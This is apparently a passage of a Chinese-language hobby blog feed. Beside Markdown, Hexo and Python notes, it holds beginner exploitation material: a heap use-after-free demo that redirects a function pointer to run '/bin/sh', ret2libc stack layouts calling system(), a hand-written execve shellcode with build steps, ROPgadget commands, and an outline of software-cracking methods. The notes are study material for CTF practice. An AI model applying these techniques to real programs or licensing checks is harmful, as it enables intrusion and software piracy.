echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1[3]=echo;</span><br><span class="line">    p1[3](&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](&quot;hello again\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果：</p><figure class="image-box">                <img src="/2018/08/28/pwn-入门n-n/result.png" alt="result" title="" class="">                <p>result</p>            </figure><p><em>漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程</em></p><p>学习借鉴文章来源：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.2--ret2libc</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/</url>
      <content type="html"><![CDATA[<p>ret2libc学习</p><h1 id="ret2libc使用原因"><a href="#ret2libc使用原因" class="headerlink" title="ret2libc使用原因"></a>ret2libc使用原因</h1><p>程序不是静态编译，通常就不会有int 0x80<br>s<br>ret2syscall 就无法实现，因而使用</p><p>ret2library。</p><h1 id="调用函数的栈结构布局-："><a href="#调用函数的栈结构布局-：" class="headerlink" title="调用函数的栈结构布局 ："></a>调用函数的栈结构布局 ：</h1><ul><li><p>调用函数的返回地址</p></li><li><p>函数调用完的返回地址</p></li><li><p>调用函数的参数1</p></li><li><p>调用函数的参数2</p></li></ul><h1 id="利用过程分析："><a href="#利用过程分析：" class="headerlink" title="利用过程分析："></a>利用过程分析：</h1><p>ASLR使得每次载入的函数地址（base）都不同</p><p>实际地址 Address = base +offset</p><p><em>若地址为 0xf…  则其为实际地址；</em></p><p>offset在libc库中是固定的；</p><ul><li>查看libc库版本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ldd  ./file</span><br></pre></td></tr></table></figure><ul><li>寻找偏移地址 ：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a  /lib32/libc.so.6 | grep gets@</span><br></pre></td></tr></table></figure><ul><li>目标是寻找libc 的 base :</li></ul><p>1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset</p><p>2.从stack残渣中获取libc地址信息</p><h1 id="延迟绑定（没搞清楚，之后再写）"><a href="#延迟绑定（没搞清楚，之后再写）" class="headerlink" title="延迟绑定（没搞清楚，之后再写）"></a>延迟绑定（没搞清楚，之后再写）</h1><p>函数调用方式：</p><p>call  func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address）</p><h1 id="使用调用函数的栈结构布局："><a href="#使用调用函数的栈结构布局：" class="headerlink" title="使用调用函数的栈结构布局："></a>使用调用函数的栈结构布局：</h1><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">pop1_ret(pop&lt;buf&gt; 然后 return）</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>软件保护/软件破解 及对抗</title>
      <link href="/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/"/>
      <url>/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/</url>
      <content type="html"><![CDATA[<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><h2 id="简单算法注册保护："><a href="#简单算法注册保护：" class="headerlink" title="简单算法注册保护："></a>简单算法注册保护：</h2><p>输入用户名序列号，计算并检测序列号；</p><h2 id="简单算法注册保护的对抗："><a href="#简单算法注册保护的对抗：" class="headerlink" title="简单算法注册保护的对抗："></a>简单算法注册保护的对抗：</h2><p>①修改关键指令：暴力破解；patcher<br>②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机<br>③还原本身算法；keygen</p><h2 id="复杂算法注册保护："><a href="#复杂算法注册保护：" class="headerlink" title="复杂算法注册保护："></a>复杂算法注册保护：</h2><p>通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等；</p><h2 id="复杂算法注册保护的对抗："><a href="#复杂算法注册保护的对抗：" class="headerlink" title="复杂算法注册保护的对抗："></a>复杂算法注册保护的对抗：</h2><p>①patch<br>②补丁修改公钥，使用自己的公钥对；</p><h2 id="网络加密及硬件加密："><a href="#网络加密及硬件加密：" class="headerlink" title="网络加密及硬件加密："></a>网络加密及硬件加密：</h2><p>本质上与本地加密相同/运行前检测？？</p><h2 id="网络加密及硬件加密的对抗："><a href="#网络加密及硬件加密的对抗：" class="headerlink" title="网络加密及硬件加密的对抗："></a>网络加密及硬件加密的对抗：</h2><p>①patch<br>②模拟与远程端的通信，及模拟执行；<br>③使用中转程序，从服务器获得远程执行结果；</p><h2 id="复杂系统注册保护："><a href="#复杂系统注册保护：" class="headerlink" title="复杂系统注册保护："></a>复杂系统注册保护：</h2><p>以上内容混杂</p><p>附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测</p><h1 id="软件破解及对抗"><a href="#软件破解及对抗" class="headerlink" title="软件破解及对抗"></a>软件破解及对抗</h1><h2 id="程序分析及对抗："><a href="#程序分析及对抗：" class="headerlink" title="程序分析及对抗："></a>程序分析及对抗：</h2><ul><li>代码变形mutation；</li><li>代码膨胀expansion；</li><li>花指令；</li><li>代码乱序；</li><li>平坦化；</li></ul><h2 id="程序调试及对抗："><a href="#程序调试及对抗：" class="headerlink" title="程序调试及对抗："></a>程序调试及对抗：</h2><ul><li>系统API检测程序是否处于被调试状态；</li><li>检测调试器窗口信息、状态码；</li><li>检测调试器驱动，符号；</li><li>程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）；</li><li>利用驱动接管本身程序的中断，阻止被调试器接管；</li><li>利用驱动修改内核参数，阻止程序被调试；</li><li>双进程反调试；</li></ul><h2 id="程序修改及对抗："><a href="#程序修改及对抗：" class="headerlink" title="程序修改及对抗："></a>程序修改及对抗：</h2><p>修改：文件补丁技术及工具；<br>对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等；</p><p><em>dnspy：.NET程序逆向工具</em></p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo Essay Writing</title>
      <link href="/2018/08/15/hexo-essay-writing/"/>
      <url>/2018/08/15/hexo-essay-writing/</url>
      <content type="html"><![CDATA[<ol><li>打开git,进入MyBlog目录；</li><li>输入 <code>hexo new &quot;essay-name&quot;</code>；</li><li>打开source文件夹，找到 essay-name.md，使用markdown语法写作；</li><li>执行命令 <code>/ hexo clean / hexo generate/ hexo deploy</code>；</li><li>over；</li></ol><p><strong>假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。</strong></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Markdown standard</title>
      <link href="/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/13/markdown%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h1 id="MarkDown-v1-0"><a href="#MarkDown-v1-0" class="headerlink" title="MarkDown v1.0"></a>MarkDown v1.0</h1><h2 id="1-1-全局规范"><a href="#1-1-全局规范" class="headerlink" title="1.1 全局规范"></a>1.1 全局规范</h2><p><a name="top"></a></p><ul><li>MarkDown 文件使用‘.md’结尾 （<strong>小写字母</strong>)</li></ul><h2 id="格式规范"><a href="#格式规范" class="headerlink" title="格式规范"></a>格式规范</h2><h3 id="标题结构格式"><a href="#标题结构格式" class="headerlink" title="标题结构格式"></a>标题结构格式</h3><p>1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开<br>2.’#’号和文字之间’一个空格’连接<br>3.标题层级最多六级 ‘#’到’######’</p><h3 id="加强和强调规范"><a href="#加强和强调规范" class="headerlink" title="加强和强调规范"></a>加强和强调规范</h3><p>一般统一使用第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*emphasize*</span><br><span class="line">_emphasize_</span><br></pre></td></tr></table></figure><p>使用’~~’给文字添加删除线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~strikethrough~~</span><br></pre></td></tr></table></figure></p><h3 id="代码块规范"><a href="#代码块规范" class="headerlink" title="代码块规范"></a>代码块规范</h3><ul><li>行内代码使用’一对波浪号’如：<code>hello world!</code></li><li>块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &apos;看源码之三个波浪号&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><pre><code>&lt;?php    echo &apos;看源码之四空格缩进&apos;;?&gt;</code></pre><h3 id="列表写法"><a href="#列表写法" class="headerlink" title="列表写法"></a>列表写法</h3><ul><li>列号’1.’或者’*’后内容用空格隔开</li><li>列表块前后’整行隔开’ 如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Windows  </span><br><span class="line">2. Mac</span><br><span class="line">3. iOS</span><br><span class="line">    * iPhone</span><br><span class="line">    * iPad</span><br><span class="line">4. Android</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ol><li>Windows  </li><li>Mac</li><li>iOS<ul><li>iPhone</li><li>iPad</li></ul></li><li>Android</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br><span class="line">    1. v3.2</span><br><span class="line">    2. v4.1</span><br></pre></td></tr></table></figure><p><strong>实际预览：</strong></p><ul><li>Windows  </li><li>Mac</li><li>iOS</li><li>Android<ol><li>v3.2</li><li>v4.1</li></ol></li></ul><h3 id="其他标签规范"><a href="#其他标签规范" class="headerlink" title="其他标签规范"></a>其他标签规范</h3><p>链接和email</p><p>Inline：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An [example](http://url.com/ &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>实现效果：<br>An <a href="http://url.com/" title="title" target="_blank" rel="noopener">example</a></p><p>引用样式标签（titles are optional）:</p><pre><code>An [example][id].Then,anywhereelse in the doc,define the link:[id]:http://example.com/ &quot;title&quot;</code></pre><p>Email:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An email &lt;example@example.com&gt; link.</span><br></pre></td></tr></table></figure><p>插图<br>Inline(titles are optional)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![alt text](/path/img.jpg &quot;title&quot;)</span><br></pre></td></tr></table></figure><p>引用式插图：</p><pre><code>![alt text][id][id]:/url/to/img.jpg &quot;title&quot;</code></pre><p>引用块及嵌套</p><blockquote><p>Email-style angle brackets<br>are used for blockquotes.</p></blockquote><blockquote><blockquote><p>And, they can be nested.</p></blockquote></blockquote><blockquote><h4 id="Headers-in-blockquotes"><a href="#Headers-in-blockquotes" class="headerlink" title="Headers in blockquotes"></a>Headers in blockquotes</h4><ul><li>You can quote a list.</li><li>Etc.</li></ul></blockquote><p>内联代码</p><p><code>&lt;code&gt;</code> 段落中的用法</p><p>也可以 <code>`代码中包含波浪号`</code>.<br>代码块</p><p>Indent every line of a code block by at least 4 spaces or 1 tab.<br>代码的每行都最少用4个空格或者一个制表符(tab)</p><p>我是普通文本块</p><pre><code>我是一个预格式化的代码块.</code></pre><p>水平分割线<br>三个<code>连字符-</code>:</p><hr><h3 id="表格规范"><a href="#表格规范" class="headerlink" title="表格规范"></a>表格规范</h3><p>一个简单的表格看起来如下：</p><table><thead><tr><th>第一个头部</th><th>第二个头部</th><th>第三个头部</th></tr></thead><tbody><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr><tr><td>内容格子</td><td>内容格子</td><td>内容格子</td></tr></tbody></table><p>每列的对齐可以通过在分割线上添加冒号来实现：</p><table><thead><tr><th style="text-align:left">第一个头部</th><th style="text-align:center">第二个头部</th><th style="text-align:right">第三个头部</th></tr></thead><tbody><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:left">左对齐</td><td style="text-align:center">居中</td><td style="text-align:right">右对齐</td></tr></tbody></table><h3 id="页内锚标记"><a href="#页内锚标记" class="headerlink" title="页内锚标记"></a>页内锚标记</h3><ul><li><a href="#11全局规范">点我跳转到顶部</a>   // 利用 <code>#</code>,<code>##</code> 生成 <code>id</code> 锚标签  </li><li><a href="#top">另一种锚标记</a> // 利用 <code>&lt;a name=&quot;top&quot;&gt;&lt;/a&gt;</code></li></ul><hr><p>附：参考 Hello-World.md 源码，<em>注意换行的使用</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Hello-World</span><br><span class="line"></span><br><span class="line">这是一个范例文件格式</span><br><span class="line">我是普通换行</span><br><span class="line"></span><br><span class="line">## 我是&lt;h2&gt;标题</span><br><span class="line"></span><br><span class="line">我是`&lt;h2&gt;`的内容</span><br><span class="line"></span><br><span class="line">## 我是&lt;h3&gt;标题</span><br><span class="line"></span><br><span class="line">* Windows  </span><br><span class="line">*  Mac</span><br><span class="line">*  iOS</span><br><span class="line">*  Android</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.1</title>
      <link href="/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/"/>
      <url>/2018/08/13/pwn-%E5%85%A5%E9%97%A81-1/</url>
      <content type="html"><![CDATA[<h3 id="各种变量的存储位置"><a href="#各种变量的存储位置" class="headerlink" title="各种变量的存储位置"></a>各种变量的存储位置</h3><ol><li>stack：局部变量</li><li>heap: 动态分配内存的变量（malloc/new）</li><li>bss section: 全局化的未初始化的变量</li><li>data section: 全局化的已初始化的变量<ul><li>rodata: （只读data段）全局化的静态变量（const）</li></ul></li></ol><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int a = 0;   //.data</span><br><span class="line">int b;       //.bss</span><br><span class="line">const double PI = 3.1415    //rodata</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int c = 2;    //stack</span><br><span class="line">char *d = malloc(16);    //heap</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux下将shellcode运行"><a href="#linux下将shellcode运行" class="headerlink" title="linux下将shellcode运行"></a>linux下将shellcode运行</h3><p>1.手写简易shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jmp sh</span><br><span class="line">run:</span><br><span class="line">    pop ebx</span><br><span class="line">    mov BYTE [ebx+7],0</span><br><span class="line">    xor eax,eax</span><br><span class="line">    mov al,11</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    xor edx,edx</span><br><span class="line">    int 0x80</span><br><span class="line">sh:</span><br><span class="line">    call run</span><br><span class="line">    db &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>2.一系列步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assembly:  nasm a.asm -o a.o -felf32   </span><br><span class="line">Extract Shellcode: objcopy -O binary a.o code   //将a.o中需要用内容的提取到code中</span><br><span class="line">                   xxd -i code        //将提取出来的code转换为机器码</span><br></pre></td></tr></table></figure><p>3.带入调用shellcode的程序test.c</p><pre><code>#include  &quot;code.h&quot;typedef int(*CODE)();int main(){    ((CODE)shellcode)();}Run Shellcode: gcc test.c -o test -m32 -zexexstack       </code></pre><p><em><a href="syscalls.kernelgrok.com" title="src">linux下的系统调用</a>.</em></p><h1 id="之前的一些小知识点笔记："><a href="#之前的一些小知识点笔记：" class="headerlink" title="之前的一些小知识点笔记："></a>之前的一些小知识点笔记：</h1><p>gadget :一小段以ret结尾的code</p><p>rop chain ：串联在一起的gadget</p><p>rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）.</p><p>rop关键：</p><p>查找gadget：</p><pre><code>ROPgadget --binary ./fileROPgadget --binary ret2syscall  --only &apos;pop|ret&apos; | grep eax  ROPgadget --binary  --opcode cd80c3（int 0x80 ; ret ）</code></pre><p>排列gadget：</p><p>peda：vmmap 查看程序段的可读写执行情况</p><p>也可以：./file &amp;  (后台运行，返回pid0）</p><pre><code>cat  /proc/pid0/maps</code></pre>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning python</title>
      <link href="/2018/08/02/learning-python/"/>
      <url>/2018/08/02/learning-python/</url>
      <content type="html"><![CDATA[<p><em>最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh</em></p><p><em>为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法：</em></p><h1 id="Python-string"><a href="#Python-string" class="headerlink" title="Python string"></a>Python string</h1><ol><li><p>对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符；</p><p>eg： ord(‘A’)  -&gt;65    chr(66) -&gt;B</p></li><li><p>对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’；</p></li><li><p>可以通过encode() 将Unicode表示的str编码为指定的 bytes；</p></li><li><p>格式化输出字符串：</p></li></ol><ul><li><p>c语言格式；</p></li><li><p>format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}；</p></li></ul><h1 id="python-list-and-tuple"><a href="#python-list-and-tuple" class="headerlink" title="python list and tuple"></a>python list and tuple</h1><ol><li>list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’]</li></ol><ul><li><p>len()得到元素个数；</p></li><li><p>classmates[-n]可以得到倒数第n个元素；</p></li><li><p>classmates.append(‘element’)追加元素到末尾；</p></li><li><p>insert(n,’element’)插入到指定位置；</p></li><li><p>pop()删除末尾元素；pop(i)删除指定位置元素；</p></li><li><p>classmates[n]=’element’直接替换为别的元素；</p></li><li><p>list元素可以是另一个list。</p></li></ul><ol start="2"><li>tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’)</li></ol><ul><li><p>一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const；</p></li><li><p>获取元素方法与list相同；</p></li><li><p>当只有一个元素时  t=(1,) 需要使用’，’来消除歧义；</p></li><li><p>tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。</p></li></ul><h1 id="python-dic"><a href="#python-dic" class="headerlink" title="python dic"></a>python dic</h1><p>  （同c++map）</p><p>d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3}    =&gt;  d[‘key1’] -&gt;value1</p><p>为避免key不存在：</p><ul><li>‘key’ in d 不存在则返回False；       </li><li>d.get(‘key’,value) 不存在则返回value；</li><li>pop(key)可以删除key即对应的value。</li></ul><h1 id="python-set"><a href="#python-set" class="headerlink" title="python set"></a>python set</h1><ul><li><p>set也是一组key的集合但不储存value；key不能重复。</p></li><li><p>创建set需要提供一个list作为输入集合 s = set([1,2,3]);</p></li><li><p>add(key)添加key ；remove(key)删除key。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">和list比较，dict有以下几个特点：</span><br><span class="line"></span><br><span class="line">    查找和插入的速度极快，不会随着key的增加而变慢；</span><br><span class="line">    需要占用大量的内存，内存浪费多。</span><br><span class="line"></span><br><span class="line">而list相反：</span><br><span class="line"></span><br><span class="line">    查找和插入的时间随着元素的增加而增加；</span><br><span class="line">    占用空间小，浪费内存很少。</span><br><span class="line"></span><br><span class="line">所以，dict是用空间来换取时间的一种方法。</span><br></pre></td></tr></table></figure><h1 id="python-loop"><a href="#python-loop" class="headerlink" title="python loop"></a>python loop</h1><ol><li><p>for i in list/tuple:  把list或tuple中的每个元素带入i，执行之后缩进块的语句；</p><p>range()函数可以生成一个整数序列，list(range(n))可以将其转化为list；</p></li><li><p>while xxx：</p></li><li><p>break / continue 同c。</p></li></ol><h1 id="python-func"><a href="#python-func" class="headerlink" title="python func"></a>python func</h1><ul><li><p>空函数：pass用来做占位符，让代码格式正确。</p></li><li><p>可以返回多个值，实质上是返回的tuple；</p></li><li><p>None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Python2.7在一行输入多个数字的方法：</span><br><span class="line"></span><br><span class="line">         输入一个数字 m = int(raw_input())</span><br><span class="line"></span><br><span class="line">输入多个数字是 m, n,.... = map(int, raw_input().split())</span><br></pre></td></tr></table></figure><ul><li><p>可变参数：   函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L,  调用funcname(L)即可；</p></li><li><p>关键字参数：函数def funcname(a,b,’<em>‘’</em>‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F);</p></li><li><p>命名关键字参数：函数def funcname(a,b,’<em>‘,c,d):’</em>‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’<em>‘,c,d，e):可变参数</em>c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D);</p></li></ul><h1 id="python-slice"><a href="#python-slice" class="headerlink" title="python slice"></a>python slice</h1><p>用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’]</p><p>slice操作符使用：</p><p>  eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]；</p><p>  L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个；</p><h1 id="python-iteration"><a href="#python-iteration" class="headerlink" title="python iteration"></a>python iteration</h1><p>即循环遍历；</p><p>d = {‘a’: 1, ‘b’: 2, ‘c’: 3}</p><p>eg:</p><ul><li>循环迭代dict： for key in d://默认dict 迭代的是key ；<br>迭代value : for value in d.values()；<br>同时迭代 ：for k,v ind.items()</li></ul><ul><li>判断是否可迭代：通过collections模块的Iterable类型判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> from collections import Iterable </span><br><span class="line">isinstance(objects,Iterable)</span><br></pre></td></tr></table></figure><ul><li>下标循环的实现：通过内置的enumerate函数判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):</span><br></pre></td></tr></table></figure><h1 id="python-list-generation"><a href="#python-list-generation" class="headerlink" title="python list generation"></a>python list generation</h1><p>eg：</p><ul><li><p>生成L=[1,4,9,….100]：<code>[x*x for x in range(1,100)]</code>;</p></li><li><p>筛选出仅偶数的平方：<code>[x*x for x in range(1,100) if x%2 ==0]</code>;</p></li><li><p>两层循环生成全排列：<code>[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]</code>;</p></li><li><p>列出当前目录下所有文件即目录名：<code>import os  | [d for d in os.listdir(&#39;.&#39;)]</code>;</p></li><li><p>把一个list L 中所有字符串变为小写：<code>[s.lower() for s in L]</code>;</p></li></ul><h1 id="python-genarator"><a href="#python-genarator" class="headerlink" title="python genarator"></a>python genarator</h1><p>不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator；</p><p>方法：将列表生成式的[]改为()即可；</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The art 0f deploying shellcode</title>
      <link href="/2018/07/26/the-art-0f-deploying-shellcode/"/>
      <url>/2018/07/26/the-art-0f-deploying-shellcode/</url>
